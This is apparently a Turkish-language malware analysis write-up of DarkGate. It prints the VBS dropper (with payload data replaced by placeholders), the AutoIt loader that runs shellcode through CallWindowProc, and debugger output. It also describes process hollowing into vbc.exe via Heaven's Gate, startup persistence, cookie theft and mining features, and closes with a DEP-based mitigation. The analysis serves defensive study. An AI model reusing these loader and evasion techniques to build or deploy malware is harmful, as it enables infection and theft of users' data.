# DarkGate Malware İncelemesi

Selam! Bu yazıda DarkGate adlı kötücül yazılımın derinlemesine bir incelemesini yapacağız. DarkGate, kendini gizleyen bir VBS betiği ile başlayan, ardından AutoIt3 kullanarak pek çok zararlı faaliyeti gerçekleştiren karmaşık bir kötücül yazılımdır. Bu yazıda, DarkGate'in içeriğini ve çalışma mantığını detaylı bir şekilde inceleyeceğiz. Ayrıca, bu kötücül yazılımın nasıl engellenebileceğini de ele alacağız.

## Malware İçeriği
Malware örneğine ilk baktığımızda 1 adet vbs dosyası görüyoruz bu dosya çalıştırdığı anda yükleyiciyi çıkartıp malware içeriğinin çalışmasını sağlıyor. VBS dosyasını açtığımızda aşağıdaki gibi satırlar bizi karşılamakta.

```vb
ON ERROR RESUME NEXT
dim objShell, objFSO, objFileIn, objStreamIn, dataa,objXML,objDocElem,objStream,objFolder, appdatapath 
Set objShell = CreateObject( "WScript.Shell" )

appdatapath = "C:\" & objShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
appdatapath = "C:\" & objShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
appdatapath = "C:\" & objShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
appdatapath = "C:\" & objShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
Const foForReading          = 1 
Const foAsASCII             = 0 
Const adSaveCreateOverWrite = 2
Const adTypeBinary          = 1 

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objXML = CreateObject("MSXml2.DOMDocument")
Set objDocElem = objXML.createElement("Base64Data")
objFSO.CreateFolder(appdatapath)
objDocElem.DataType = "bin.base64"
Set objStream = CreateObject("ADODB.Stream")
objDocElem.text = "<data1>"
objStream.Type = adTypeBinary
objStream.Open()
objStream.Write objDocElem.NodeTypedValue
objStream.SaveToFile  appdatapath+"\AutoIt3.exe", adSaveCreateOverWrite

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objXML = CreateObject("MSXml2.DOMDocument")
Set objDocElem = objXML.createElement("Base64Data")
objDocElem.DataType = "bin.base64"
Set objStream = CreateObject("ADODB.Stream")
objDocElem.text = "<data2>"
objStream.Type = adTypeBinary
objStream.Open()
objStream.Write objDocElem.NodeTypedValue
objStream.SaveToFile appdatapath+"\test.au3", adSaveCreateOverWrite


Set objFSO=CreateObject("Scripting.FileSystemObject")
dim objFile 
Set objFile = objFSO.CreateTextFile(appdatapath+"\shell.txt",True)
objFile.Write "<data3>"
objFile.Close

Set objFSO=CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile(appdatapath+"\pe.bin",True)
objFile.Write "<data4>"
objFile.Close
Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute appdatapath+"\AutoIt3.exe", "test.au3", appdatapath, "open", 0
```

Özet olarak baktığımızda script 4 adet dosyayı C:\<Computer_Name>\ klasörüne çıkartmakta. Bunların isimleri "AutoIt3.exe", "test.au3", "pe.bin" ve "shell.txt"

- "AutoIt3.exe": au3 scriptlerini çalıştıran normal bir auto it uygulaması.
- "test.au3": Auto it üzerinde çalışan script dosyası.
- "pe.bin": DarkGate malwarenin en son çalıştığı pe dosyası.
- "shell.txt": pe.bin dosyasını loadlamayı sağlayan verileri içeren shell code parçacığı.

[========]

Autoit3.exe dosyasını x64dbg ile çalıştırıp incelemeyi denediğimizde ilk başta debug ortamında çalışmadığını ileten bir mesaj ile karşılaşıyoruz. Basit bir anti-debug tekniği ile kontrol sağlandığını görebiliyoruz. `IsDebuggerPresent` apisi kullanılarak debug altında çalışıp çalışmadığını kontrol ediliyor bu yöntem ise PEB üzerinden yada IsDebuggerPresent apisinin dönen değerini değişerek atlatılabilir.

Debug kontrolünü geçtikten sonra au3 scriptinin içerisinde aşağıdaki satırları görüyoruz:

```
#NoTrayIcon
FileCreateShortcut ( @AutoItExe,'C:\' & @ComputerName & '\bill.lnk' ,'C:\' & @ComputerName , "test.au3" , "" , "C:\Windows\System32\Mycomput.dll" , "" , 2 , "")

$ced = FileRead('C:\' & @ComputerName & '\shell.txt')

$pt = DLLStructCreate("byte[" & BinaryLen($ced) & "]")

DllStructSetData($pt, 1, $ced)

DllCall("user32.dll", "lresult", "CallWindowProc", "ptr", DllStructGetPtr($pt), "hwnd", 0, "uint", 0, "wparam", 0, "lparam", 0)

```

İlk satıra baktığımızda kolaylıkla Autoit3.exe si üzerinde scripti çalıştıran bilgisayar simgesi ile aynı simgeye sahip bir kısayolu aynı klasör üzerinde oluşturulduğunu görüyoruz.

Bununla beraber shell.txt içerisindeki shell kodunun memorye aktarıldığı ve CallWindowProc apisi ile bu kodun çalıştırıldığını görüyoruz. 

Shell code kısmının ne yaptığını görmek için CallWindowProc apisine breakpoint bırakalım daha sonrasında ilk parametrenin (32 bit x86 asm için stack pointer + 4 memory adresindeki değer) shell code adresine ait olduğunu görebiliyoruz. 

Shell code başlangıç adresine breakpoint atıp çalıştırdığımızda bizi aşağıdaki gibi bir assembly dizini karşılıyor:

    push ebp
    mov ebp,esp
    push eax
    mov eax,E9
    add esp,FFFFF004
    push eax
    dec eax
    jne 13F5011
    mov eax,dword ptr ss:[ebp-4]
    add esp,FFFFFFE4
    lea eax,dword ptr ss:[ebp-E8CF7]
    lea edx,dword ptr ss:[ebp-E9020]
    mov byte ptr ds:[edx],55
    mov byte ptr ds:[edx+1],8B
    mov byte ptr ds:[edx+2],EC
    mov byte ptr ds:[edx+3],83
    mov byte ptr ds:[edx+4],C4
    mov byte ptr ds:[edx+5],B0
    mov byte ptr ds:[edx+6],53
    mov byte ptr ds:[edx+7],56
	...

mov byte ptr şekline tekrar eden uzun bir kod parçacığı bulunuyor ve ilk kısmına baktığımızda add esp, 0xfffff004, push eax, dec eax satırları ile aslında stack üzerinde reserve işlemini yapıldığını görebiliyoruz 0xfffff004 değeri decimal olarak -4092 değerine eşittir. Stack adresine -4092 değeri eklenerek 4092 bytelık bir alan açılmasını sağlıyor bu işlemi bir kaç defa tekrarlayarak gereken boyut kadar alan açılmasını sağlamakta. Bu aslında sub esp, imm instructionun mutate edilmiş şekli. 

Daha sonrasında edx registerine rezerve edilen stack kısmının başlangıç adresi yazılmakta ve tek tek bytelar yazılmakta. İlk bytelara baktığımızda aşina olduğumuz klasik 55 8b ec byteları yazılmakta bu bytelar bilinen bir x86 prologue olduğunu direkt anlıyoruz ve bu yüzden burada yapılan işlem başka bir shellcodeun tekrardan byte byte yazılması olduğunu görüyoruz bu yazım işleminin sonuna geldiğimizde shell code kısmının başına jmp ile gittiğini görüyoruz ve oraya breakpoint koyarak analizimize devam ediyoruz.

Buradaki shellcode kısmını single step ile analiz etmeye devam ederken aşağıdaki şekilde bir kısım gözümüze çarpıyor:
```
011961FD | C645 B2 4C               | mov byte ptr ss:[ebp-4E],4C             | 4C:'L'
01196201 | C645 B3 6F               | mov byte ptr ss:[ebp-4D],6F             | 6F:'o'
01196205 | C645 B4 61               | mov byte ptr ss:[ebp-4C],61             | 61:'a'
01196209 | C645 B5 64               | mov byte ptr ss:[ebp-4B],64             | 64:'d'
0119620D | C645 B6 4C               | mov byte ptr ss:[ebp-4A],4C             | 4C:'L'
01196211 | C645 B7 69               | mov byte ptr ss:[ebp-49],69             | 69:'i'
01196215 | C645 B8 62               | mov byte ptr ss:[ebp-48],62             | 62:'b'
01196219 | C645 B9 72               | mov byte ptr ss:[ebp-47],72             | 72:'r'
0119621D | C645 BA 61               | mov byte ptr ss:[ebp-46],61             | 61:'a'
01196221 | C645 BB 72               | mov byte ptr ss:[ebp-45],72             | 72:'r'
01196225 | C645 BC 79               | mov byte ptr ss:[ebp-44],79             | 79:'y'
01196229 | C645 BD 41               | mov byte ptr ss:[ebp-43],41             | 41:'A'
0119622D | C645 BE 00               | mov byte ptr ss:[ebp-42],0              |
01196231 | C645 BF 56               | mov byte ptr ss:[ebp-41],56             | 56:'V'
01196235 | C645 C0 69               | mov byte ptr ss:[ebp-40],69             | 69:'i'
01196239 | C645 C1 72               | mov byte ptr ss:[ebp-3F],72             | 72:'r'
0119623D | C645 C2 74               | mov byte ptr ss:[ebp-3E],74             | 74:'t'
01196241 | C645 C3 75               | mov byte ptr ss:[ebp-3D],75             | 75:'u'
01196245 | C645 C4 61               | mov byte ptr ss:[ebp-3C],61             | 61:'a'
01196249 | C645 C5 6C               | mov byte ptr ss:[ebp-3B],6C             | 6C:'l'
0119624D | C645 C6 41               | mov byte ptr ss:[ebp-3A],41             | 41:'A'
01196251 | C645 C7 6C               | mov byte ptr ss:[ebp-39],6C             | 6C:'l'
01196255 | C645 C8 6C               | mov byte ptr ss:[ebp-38],6C             | 6C:'l'
01196259 | C645 C9 6F               | mov byte ptr ss:[ebp-37],6F             | 6F:'o'
0119625D | C645 CA 63               | mov byte ptr ss:[ebp-36],63             | 63:'c'
01196261 | C645 CB 00               | mov byte ptr ss:[ebp-35],0              |
```

Gözümüze çarpan 2 string oluyor biri LoadLibraryA diğeri ise VirtualAlloc LoadLibrary windows üzerinde modülleri yüklemeye yarayan bir api VirtualAlloc ise memory allocate etmek için kullanılan bir kısım. Buna baktığımızda aslında bu shellcode başka bir pe yi manual maplemek için kullanılmakta olduğunu anlıyoruz biraz daha ilerlediğimizde manual map edilen dll dosyasının entry pointinde breakpoint koyup bekliyoruz ve o kısmın çalıştığını görüp daha sonrasında incelemeye devam ediyoruz.

İncelemeyi yaptığımızda ilk satırlarda aşağıdaki gibi bir string gözümüze çarpıyor:
```
04224743 | B8 604A2204              | mov eax,4224A60                         | 4224A60:"pe.bin"
```

pe.bin dosyası vbs üzerinden çıkartılan bir dosyaydı ve manual maplenen penin bunu okuyup çalıştıracağını anlıyoruz. 

Stringlere baktığımızda aşağıdaki tarzda stringler dikkatimizi çekiyor:
```
Address=04222C30
Disassembly=push 4222C68
String Address=04222C68
String="NtAllocateVirtualMemory"
Address=04222CD3
Disassembly=push 4222F08
String Address=04222F08
String="NtProtectVirtualMemory"
Address=04222D57
Disassembly=push 4222F08
String Address=04222F08
String="NtProtectVirtualMemory"
Address=04222D93
Disassembly=push 4222F28
String Address=04222F28
String="NtWriteVirtualMemory"
Address=04222DD3
Disassembly=push 4222F48
String Address=04222F48
String="NtFlushInstructionCache"
Address=04222E2D
Disassembly=push 4222F08
String Address=04222F08
String="NtProtectVirtualMemory"
Address=04222E6E
Disassembly=push 4222F28
String Address=04222F28
String="NtWriteVirtualMemory"
Address=04222EAF
Disassembly=push 4222F08
String Address=04222F08
String="NtProtectVirtualMemory"
Address=04222EE9
Disassembly=push 4222F48
String Address=04222F48
String="NtFlushInstructionCache"
Address=04222FD0
Disassembly=push 4223164
String Address=04223164
String="NtReadVirtualMemory"
Address=0422303A
Disassembly=push 4223164
String Address=04223164
String="NtReadVirtualMemory"
Address=042230AD
Disassembly=push 4223164
String Address=04223164
String="NtReadVirtualMemory"
Address=0422336C
Disassembly=push 4223404
String Address=04223404
String="NtWriteVirtualMemory"
Address=042233AE
Disassembly=push 4223424
String Address=04223424
String="NtProtectVirtualMemory"
Address=042233E6
Disassembly=push 4223444
String Address=04223444
String="NtFlushInstructionCache"
Address=04223597
Disassembly=push 422394C
String Address=0422394C
String="NtGetContextThread"
Address=04223620
Disassembly=push 4223968
String Address=04223968
String="NtReadVirtualMemory"
Address=04223669
Disassembly=push 4223984
String Address=04223984
String="NtUnmapViewOfSection"
Address=042237A7
Disassembly=push 42239A4
String Address=042239A4
String="NtSetContextThread"
Address=042237FD
Disassembly=push 42239C0
String Address=042239C0
String="NtResumeThread"
Address=04223848
Disassembly=push 42239D8
String Address=042239D8
String="NtTerminateProcess"
Address=04223879
Disassembly=push 42239D8
String Address=042239D8
String="NtTerminateProcess"
Address=042238D8
Disassembly=push 42239F4
String Address=042239F4
String="NtFreeVirtualMemory"
Address=04223908
Disassembly=push 42239D8
String Address=042239D8
String="NtTerminateProcess"
Address=04223A25
Disassembly=mov edx,4223AC0
String Address=04223AC0
String="C:\\Windows\\"
Address=04223A32
Disassembly=mov ecx,4223AD4
String Address=04223AD4
String="Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"
Address=04223A4D
Disassembly=mov ecx,4223AD4
String Address=04223AD4
String="Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"
Address=04223A5F
Disassembly=mov ecx,4223B08
String Address=04223B08
String="Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe"
Address=04223A7A
Disassembly=mov ecx,4223B08
String Address=04223B08
String="Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe"

```

Kullanılan apileri gördüğümüzde çok net bir şekilde vbc.exe process hollowing yöntemi kullanılarak malware dosyasının çalıştırılacağını tahmin edebiliyoruz. Emin olabilmek adına yukarıdaki apilere breakpoint koyuyoruz fakat program hiçbir zaman breakpointler tetiklenmiyor bununla beraber vbc.exe dosyasının çalıştığını ve malwarenin loadlandığını görüyoruz. 

Apiler breakpointe tetiklenmediğine göre farklı bir şekilde çalıştırıldığını anlıyoruz. Bu yöntem genellikle 64 bit processlarda direkt syscall instructionu ile yapılırken 32 bit processlarda heavens gate kısmının çağrılması ile yapılmakta. Heavens Gate 32 bit işlemlerin 64 bit üzerinde çalışması için windows tarafından geliştirilen bir emülatör diyebiliriz. Heavens Gate adresine koyduğumuz breakpoint ile apilerin tetiklendiğini görebiliyoruz. Ve NtWriteVirtualMemory kısmına koyduğumu breakpoint ile yazılacak olan veriyi dumpluyoruz bu veri asıl darkgate malware kodlarının çalıştığı pe. 

Bu pe içerisindeki stringlere baktığımızda aşağıdaki satırlar dikkatimizi çekiyor:

```
Address=0042F08B
Disassembly=mov ecx,darkgate.42F164
String Address=0042F164
String="sitemanager.xml"

Address=00432849
Disassembly=push darkgate.4336E0
String Address=004336E0
String="\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\google.lnk"

Address=00431FA9
Disassembly=mov eax,darkgate.4320B8
String Address=004320B8
String="C:\\cookies\\Chrome"

Address=0043201C
Disassembly=mov edx,darkgate.4320B8
String Address=004320B8
String="C:\\cookies\\Chrome"

Address=004335C6
Disassembly=mov eax,darkgate.433C80
String Address=00433C80
String="startminer"

Address=004330AC
Disassembly=mov eax,darkgate.433AD0
String Address=00433AD0
String="getskypechats"

Address=004329E5
Disassembly=mov edx,darkgate.4337B8
String Address=004337B8
String="capturescreen"

```

Stringlerden darkgate malware içerisinde ekran kaydetme, şifre çalma, skype mesajlarını görme, mining yapma ve dosya yöneticisi gibi özelliklerin olduğunu görebiliyoruz. Bununla beraber ilk au3 scripti ile birlikte oluşturulan kısayolu başlangıç klasörüne kopyalandığını görebiliyoruz bununla beraber başlangıçta sürekli açılmasını sağlamakta. Ve başlangıç dosyası autoit3.exe olduğu için antivirüslerin pek dikkatini çekmemekte. 

## Özet Olarak
Özet olarak baktığımızda malware aşağıdaki adımlarla beraber kendini loadlamakta:
1. vbs ile beraber 4 adet dosya çıkartılır.
2. AutoIt3.exe çalıştırılarak au3 scripti çalıştırılır.
3. AutoIt3 dosyası shell code parçacığını çalıştırır.
4. Shell code parçacığı yine tekrardan kendi içerisinde barındırdığı farklı bir shell code kısmını manual mapler.
5. Manual maplenen shell code pe.bin dosyasını okur ve vbc.exe dosyası üzerinde process hollowing tekniği ile kendini loadlar. 

# Engelleme Yöntemi
Autoit scriptini açtığımızda CallWindowProc üzerinde çalışan shellcode kısmına baktığımızda PAGE_READWRITE izninize sahip olduğunu execute edilme izninin olmadığını fakat  buna rağmen çalıştığını görüyoruz. Normal şartlarda DEP (Data Execution Prevent) bunun çalışmasını engellemesi gerekirken buradaki payload çalışmakta bunun sebebi 32 bit processlarda DEP normal olarak devre dışı. Bunu windows ayarlarından açtığınız zaman shellcode çalışamadan STATUS_ACCESS_VIOLATION kodu ile hata üretmekte ve başarısız olmakta. 
